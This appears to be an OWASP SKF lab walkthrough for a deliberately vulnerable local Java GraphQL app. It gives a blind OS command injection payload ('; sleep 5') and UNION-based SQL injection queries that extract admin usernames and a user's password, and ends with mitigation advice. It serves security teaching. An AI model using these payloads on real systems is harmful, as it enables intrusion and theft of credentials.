# GraphQL Injection

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:java-graphql-injections
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:java-graphql-injections
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

This lab shows that GraphQL is not a silver bullet to any of the injection vulnerabilities.

We will look at two of the most common ones:

- OS Command Injection
- Sql Injection

We still see the blog that we should be familiar by now.

Let's login with: admin/admin

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Graphql-Injections/1.png)

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Graphql-Injections/2.png)

If you run your DirBuster against it or just manually try to guess few of the rountes you will notice the new `/admin` section of the web app.

```
http://0.0.0.0:5000/admin
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Graphql-Injections/3.png)

There we have two functionalities:

- Check SQL Server Status
- Query User detiails

Both of them look suspicious, so play around and understand what they actually do.

Hint: you can also use what you have learned from the Introspection lab to understand the queries and mutations in the admin part ;)

## Exploitation

Your gut feeling is right and the _Check SQL Server Status_ should be vulnerable to _OS Command Injection_ and _Query User detiails_ should be vulnerable to _SQL injection_ attacks.

Let's get it on!

### OS Command Injection

The _Check SQL Server Status_ form has one input field where a server and a port are expected.

Go about and try check if some of the well known SQL Server ports are open on the server.

Probablly your first try was MySQL 3306 - 127.0.0.1:3306. Play around with few other ports and IPs and observe the results we receive.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/4.png)

Now go ahead and try to execute some other system commands, append, pipe, ...

Apparently our input is being passed to a system command which gets executed and we get response code of it. By looking in the code we can see it is passed to a `new ProcessBuilder` call.

This makes it a bit harder as we don't see the actual output of the command but we don't need that... enter **_Blind OS Command Injection_**

How about we try to a valid command that time effective and we can observe that... kind of an oracle, a Time Oracle.

Let's try: `127.0.0.1:3306; sleep 5`

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/5.png)

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/6.png)

The application is taking a bit longer to reply, let's try another os command to make sure:

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/7.png)

As you have observed the `xcalc` command got executed and we were able to open the calculator. w00t, w00t!

Now, it' up to you to come up with scenario how to further abuse this.

### SQL Injection

Staying on the same `/admin` we also see _Query User detiails_ functionality which allowes an Administrator to get information about users by providing `username` values.

Go aronud find locate the GraphQL query that executes this transaction.

Now try to fetch some information for valid or invalid users. How about trying some SQL Injection payloads? :)

```
Example:
' UNION SELECT id, null, null FROM user --")
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/8.png)

By now we are aboslutly sure that this is an SQL Injection point and it is pretty that we are dealing with UNION style SQL Injection.
Next up, let's try to find the other blog admins:

```
{getUser(username:\"' UNION SELECT id, username,null FROM user WHERE admin = true --\"){id, username}}
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/9.png)

Lets try to get the password of some user:

```
{getUser(username:\"' UNION SELECT id, username, password FROM user WHERE username = 'johndoe' --\"){id, username}}
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/10.png)

We face few hurdles here:

- The query only returns one row (the first row)
- We cannot see the `password` value as our GraphQL `User` model excludes the `password` column/field

```java
public User(int id, String username, boolean admin) {
    this.id = id;
    this.username = username;
    this.admin = admin;
}
```

This means we need to get the password out from the UNION SELECT in another variable that is passed back.

The laziest approach, if our target is to get the password, is to return in all fields:

```
{getUser(username:\"' UNION SELECT password, password, password FROM user WHERE username = 'johndoe' --\"){id, username}}
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/java/Graphql-Injections/11.png)

w00t w00t!

What else can you!?

## Solution

### OS Command Injection

By know you fully understand that GraphQL does not handle input validation or santization for you. It actually has nothing to do with it. So, fixing the code in this lab does not differ to any of your previous practices on fixing code for OS Command Line injection.

### SQL Injection

SQL Injections have been present and known as vulnerability for such a long time which means that the mitigations are known, documented and well explained. Mitigating against SQL Injections when it comes to GraphQL powered applications are the same as for any other technology.
In this particular project we use Hibernate as ORM. However, as can be seen in our example mistakes can be made if we concatinate unsanitized, user provided string input to our Hibernate queries.

The solution?

- Sanitize the input
- Use parameterized queries
- Use Hibernate as described in documentation

## Additional resources

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html" %}
